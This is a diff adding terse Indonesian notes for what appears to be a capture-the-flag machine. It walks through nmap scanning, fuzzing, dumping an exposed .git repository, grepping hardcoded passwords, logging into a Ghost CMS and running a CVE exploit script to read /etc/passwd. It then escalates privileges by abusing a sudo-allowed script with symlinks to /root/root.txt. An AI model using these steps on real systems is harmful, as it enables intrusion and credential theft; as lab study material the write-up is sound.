@@ -1,0 +1,18 @@
+1. scan nmap nanti dapet host domain 22 80 kebuka ke etc hosts aja
+2. next fuzz ampe dapet dir -> gada fuzz subdo -> dapet tuh fuzz lagi -> ada .git
+3. dumper aja git nya -> ./git-dumper url output -> dapet coba masuk situ ke ghost aja
+4. susah nyari banyak bet gini aja langsung -> grep -Ri "const password =" . -> arahin ke file nya ada 2 passwd disitu
+5. gas dapet tuh creds nya mungkin 2 itu uname passwdnya -> nah itu dari folder admin kan 
+6. jadi uname nya mungkin -> admin@namahost.host -> passwdnya salah satu tadi 
+7. dapet versi cms nya di settings -> about -> cari aja cve nya 
+8. pake tools exploitnya ternyata salah2 di masang host nya -> cukup ambil sebus.sbs nya aja gausah / / an
+9. ./namatools.sh -u admin@namahost.host -p password -> dah coba /etc/passwd ada
+10. next coba cat Dockerfile di hasil git dumper nya tadi -> nanti cari path config nya -> liat aja isinya ada creds
+
+PE:
+1. sudo -l -> nanti ada file bash gini tar ku simpen dulu bash nya 
+2. jadi di sudo -l dia bakal run ke file png 
+3. buat file gini  dulu -> ln -s /root/root.txt sebus.txt
+4. ln -s /home/user/sebus.txt sebus.png
+5. run gini -> sudo CHECK_CONTENT=true [command yg di sudo -l] /home/user/sebus.png
+6. klaim flag 
